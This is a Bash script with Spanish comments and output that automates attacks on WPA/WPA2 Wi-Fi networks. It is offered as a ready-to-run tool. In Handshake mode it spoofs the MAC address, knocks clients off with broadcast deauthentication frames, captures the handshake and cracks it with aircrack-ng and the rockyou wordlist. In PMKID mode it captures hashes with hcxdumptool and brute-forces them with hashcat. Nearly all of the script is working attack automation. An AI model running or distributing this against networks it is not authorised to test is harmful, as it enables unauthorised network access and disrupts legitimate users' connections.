#!/bin/bash

# Author: s4vitar - nmap y pa' dentro

# Add an extra auto parameter for auto-detect wlan iface
# Fix missing and enhance existing software requirements
# Check wordlist
# Additional stuff: omgs

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Dictionary path
wordList="/usr/share/wordlists/rockyou.txt"
wordListDir=$(dirname $wordList)
commonDeps="aircrack-ng macchanger wget git make"

# Poner cualquier cosa para reiniciar el NetworkManager al final
NetworkManager="1"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
	tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
	rm Captura* 2>/dev/null
	exit 0
}

function helpPanel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./${0}${endColour}"
	echo -e "\n\t${purpleColour}a)${endColour}${yellowColour} Modo de ataque${endColour}"
	echo -e "\t\t${redColour}Handshake${endColour}"
	echo -e "\t\t${redColour}PKMID${endColour}"
	echo -e "\t${purpleColour}n)${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}"
	echo -e "\t${purpleColour}h)${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}\n"
	exit 0
}

function checkDependencies(){
	tput civis
	clear;

	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
	sleep 2

	checkInstallPackages $commonDeps

	# Check wordList
	if [ ! -d $wordListDir ];then
		echo -e "${redColour}No existe el directorio del wordList. Se crea.${endColour}\n"
		mkdir -p $wordListDir
	fi
	if [ ! -f $wordList ];then
		echo "${redColour}No existe el diccionario. Descargando...${endColour}\n"
		wget -O $wordList -N -nd 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
	fi

	if [[ "$attack_mode" == "PKMID" ]];then
		# Comprobamos si hay versiones recientes de hashcat y hcxtools
		hashcat=""
		if [[ -f $(which hashcat) ]];then
			# Miramos a ver si la version de hashcat es al menos la v6.X
			if [[ $(hashcat -V) > "v5" ]];then
				hashcat="1"
			fi
		fi
		# Descargamos las fuentes en /usr/src
		pushd /usr/src >/dev/null
		# No está instalado o tiene una versión antigua
		if [[ -z $hashcat ]];then
			checkInstallPackages libcurl4-openssl-dev libssl-dev pkg-config
			echo -e "${redColour}No existe o no actualizado hashcat. Descargando...${endColour}\n"
			git clone https://github.com/hashcat/hashcat.git
			cd hashcat
			make && make install && apt remove -y hashcat 2>/dev/null
			hash -r
			cd ..
		fi
		if [[ -z $(which hcxpcapngtool) ]];then
			echo -e "${redColour}No existe o no actualizado hcxtools. Descargando...${endColour}\n"
			git clone https://github.com/ZerBea/hcxtools
			cd hcxtools
			make && make install
			cd ..
			git clone https://github.com/ZerBea/hcxdumptool
			cd hcxdumptool
			make && make install
			cd ..
		fi
		popd >/dev/null
	fi
}

function autoWlan() {
	networkCard="";
	echo -e "\n${yellowColour}Detectando tarjeta de red...${endColour}"
	for iface in $(grep ':' /proc/net/dev|cut -d: -f1);do
		iwconfig $iface>/dev/null 2>&1
		if [ $? == 0 ]; then
			networkCard=$iface
			echo -e "${greenColour}OK: $iface${endColour}\n"
		fi
	done
	if [[ -z $networkCard ]];then
		echo -e "${redColour}NO SE PUDO DETECTAR LA TARJETA DE RED${endColour}\n"
		echo "Fin del programa"
		exit 1
	fi
}

function checkInstallPackages() {
	for package in $@;do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $package${endColour}${blueColour}...${endColour}"

		#test -f /usr/bin/$program
		if [[ $(dpkg -L $package 2>/dev/null|wc -l) != "0" ]];then

		#if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}"
		else
			echo -e " ${redColour}(X)${endColour}\n"
			echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando paquete ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
			apt-get install $package -y > /dev/null 2>&1
		fi; sleep 1
	done
}

function startAttack(){
	if [[ "$networkCard" == "auto" ]];then
		autoWlan
	fi
	# Deteccion de NetworkManager
	NM=""
	if [[ $(which nmcli) ]];then
		if [[ $(nmcli d | grep -w ^${networkCard} | awk '{ print $4 }') != "--" ]];then
			NM="1"
			nmcli dev set ${networkCard} managed no
		fi
	fi
	clear
	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
	airmon-ng start $networkCard > /dev/null 2>&1
	ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
	ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null

	echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"

	if [ "$(echo $attack_mode)" == "Handshake" ]; then

		xterm -hold -e "airodump-ng ${networkCard}mon" &
		airodump_xterm_PID=$!
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel

		kill -9 $airodump_xterm_PID
		wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
		airodump_filter_xterm_PID=$!

		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

		sleep 10; kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null

		xterm -hold -e "aircrack-ng -w $wordList Captura-01.cap" &
	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
		clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
		sleep 2
		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
		echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
		sleep 2
		#hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
		hcxpcapngtool --pmkid=myHashes Captura; rm Captura 2>/dev/null
		test -f myHashes

		if [ "$(echo $?)" == "0" ]; then
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
			sleep 2

			hashcat -m 16800 myHashes $wordList -d 1 --force
		else
			echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha podido capturar el paquete necesario...${endColour}\n"
			rm Captura* 2>/dev/null
			sleep 2
		fi
	else
		echo -e "\n${redColour}[*] Este modo de ataque no es válido${endColour}\n"
	fi
}

# Main Function

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
			n) networkCard=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		checkDependencies
		startAttack
		tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
		if [[ ! -z "NM" ]];then
			nmcli dev set ${networkCard} managed yes
			service wpa_supplicant restart
			#service network-manager restart
		fi
	fi
else
	echo -e "\n${redColour}[*] No soy root${endColour}\n"
fi
